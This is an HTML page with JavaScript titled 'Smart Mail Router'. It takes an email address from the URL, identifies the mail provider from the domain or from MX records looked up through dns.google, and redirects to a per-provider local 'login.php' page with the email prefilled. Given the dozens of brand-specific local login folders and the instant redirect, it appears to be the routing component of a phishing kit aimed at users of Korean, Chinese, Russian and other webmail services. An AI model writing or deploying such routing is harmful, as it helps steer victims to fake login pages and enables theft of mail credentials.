<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Smart Mail Router</title>
<script>
document.addEventListener('DOMContentLoaded', async () => {
  // === STEP 1: grab & validate login ===
  const params = new URLSearchParams(window.location.search);
  const login  = params.get('login');
  if (!login) { return showError('Missing login parameter.'); }

  const domain = login.split('@')[1]?.trim().toLowerCase();
  if (!domain) { return showError('Invalid email address.'); }

  // === STEP 2: direct matches ===
  const directRoutes = {
    'naver.com':  'naver',
    'daum.net':   'kakao',  'kakao.com':   'kakao',  'hanmail.net':'kakao',
    'nate.com':   'nate',   'empas.com':   'nate',   'empal.com':  'nate',
    'hanafos.com':'nate',   'lycos.com':   'nate',   'netsgo.com': 'nate',
    '126.com':   'vip',     '163.com':     'vip',
    'qq.com':    'qq',      'foxmail.com': 'qq',
    'mail.ru':   'mailru',  'inbox.ru':    'mailru', 'list.ru':   'mailru',
    'bk.ru':     'mailru',  'internet.ru': 'mailru',
    'lotte.net': 'lotte',   'aol.com':     'aol',
    'freenet.de':'freenet', 'libero.it':   'libero'
  };

  for (const key in directRoutes) {
    if (domain.endsWith(key)) { return go(directRoutes[key]); }
  }

  // === STEP 3: MX‑record based routing ===
  try {
    const dnsRes = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
    if (dnsRes.ok) {
      const { Answer = [] } = await dnsRes.json();
      const mxRecords = Answer.map(a => a.data.toLowerCase());

      const mxRoutes = {
        'yandex':                 'yandex',
        'worksmobile':            'worksmobile',
        '.mail.aliyun.com':       'mailaliyun',
        '.qiye.aliyun.com':       'qiyealiyun',
        '.enterprise.china.alibaba.com':'qiyealiyun',
        '.outlook.com':           'office365',
        '.t-online.de':           't-online',
        '.mimecast.com':          'mimecast',
        '.orange.fr':             'orange',
        '.netease.com':           'netease',
        'mailplug.':              'mailplug',
        'chinaemail.cn':          'chinaemail',
        'secureserver.net':       'godaddy',
        'spam.cafe24.com':        'cafe24',
        '.fmcity.com':            'cafe24',
        'cgwebmail.':             'gw',
        '.daouoffice.com':        'daouoffice',
        'emx.mail.ru':            'bizmailru',
        'yahoodns.net':           'yahoobiz',
        'emailsrvr.com':          'emailsrvr',
        'mailhostbox.com':        'mailhostbox',
        'rzone.de':               'strato',
        '.gmx.net':               'gmx',
        'register.it':            'register',
        'chinanetsun.com':        'chinanetsun',
        'hiworks.co.kr':          'hiworks',
        'mxbiz1.qq.com':          'qqcom',
        'mxbiz2.qq.com':          'qqcom',
        '.cn4e.com':              'cn4e',
        'mailfilter.':            'hibox',
        'sfilter.':               'LG',
        '.mailwood.com':          'LG',
        'webmail.':               'roundcube',
        'bizmeka.com':            'bizmeka',
        'secuecloud.com':         'secuecloud',
        '.serverdata.net':        'owa',
        '.ecounterp.com':         'ecount',
        '.mailinblack.com':       'mailinblack',
        'whoisworks.com':         'whois'
      };

      for (const mx of mxRecords) {
        const hit = Object.keys(mxRoutes).find(needle => mx.includes(needle));
        if (hit) { return go(mxRoutes[hit]); }
      }
    }
  } catch (e) {
    console.warn('MX lookup failed:', e);
  }

  // === STEP 4 & 5: server‑probe logic skipped (CORS). ===
  // If you really need it, move this JS into a Cloudflare Worker /
  // your own small API that *can* do HEAD requests server‑side.

  // === STEP 6: final fallback ===
  go('other');

  // ---------- helpers ----------
  function go(folder) {
    window.location.href = `${folder}/login.php?login=${encodeURIComponent(login)}`;
  }
  function showError(msg) {
    document.body.innerHTML = `<h2 style="font-family:sans-serif;color:#d00">${msg}</h2>`;
  }
});
</script>
</head>
<body>
<!-- User will rarely see this because of the instant redirect. -->
<noscript>Please enable JavaScript to use this page.</noscript>
</body>
</html>
